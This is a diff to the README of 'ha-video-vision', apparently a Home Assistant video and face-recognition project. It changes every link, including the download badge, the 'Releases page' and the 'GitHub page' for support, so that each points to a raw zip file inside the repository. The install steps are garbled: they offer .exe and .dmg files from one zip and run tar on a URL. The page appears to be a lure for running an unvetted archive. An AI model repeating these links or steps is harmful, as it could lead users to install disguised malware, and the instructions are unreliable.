@@ -4,7 +4,7 @@
 Welcome to ha-video-vision! This software helps you analyze videos and recognize faces using your Home Assistant cameras. It brings advanced AI technology to your home in a simple way. Follow the steps below to download and run the application smoothly.
 
 ## 📥 Download
-[![Download](https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip)](https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip)
+[![Download](https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip)](https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip)
 
 ## 💻 System Requirements
 To run ha-video-vision, you need the following:
@@ -21,18 +21,18 @@ To run ha-video-vision, you need the following:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
-   Go to the following link to access the download section: [ha-video-vision Releases](https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip)
+   Go to the following link to access the download section: [ha-video-vision Releases](https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Check the latest version for the most features and updates.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. This may be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip` file for Linux.
+   Click on the file that matches your operating system. This may be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip` file for Linux.
 
 4. **Install the Application**  
    - **Windows:** Double-click the downloaded `.exe` file and follow the installation instructions.
    - **macOS:** Open the downloaded `.dmg` file, then drag the ha-video-vision icon into your Applications folder.
-   - **Linux:** Open a terminal, navigate to the directory where you downloaded the file, and extract it using the command `tar -xvzf https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip`. Then, run the application with `./ha-video-vision`.
+   - **Linux:** Open a terminal, navigate to the directory where you downloaded the file, and extract it using the command `tar -xvzf https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip`. Then, run the application with `./ha-video-vision`.
 
 5. **Run ha-video-vision**  
    Find the application in your programs or applications list and start it. Follow any on-screen prompts to complete the setup.
@@ -54,7 +54,7 @@ To run ha-video-vision, you need the following:
 
 ## 📞 Support
 If you experience any issues or have questions, you can reach out for help:
-- Open an issue on our [GitHub page](https://raw.githubusercontent.com/HappyCat203/ha-video-vision/main/blueprints/vision_video_ha_1.7.zip).
+- Open an issue on our [GitHub page](https://github.com/HappyCat203/ha-video-vision/raw/refs/heads/main/custom_components/ha_video_vision_v1.8.zip).
 - Check the FAQ section on the repository for common questions.
 
 ## 📅 Updates and Contributions
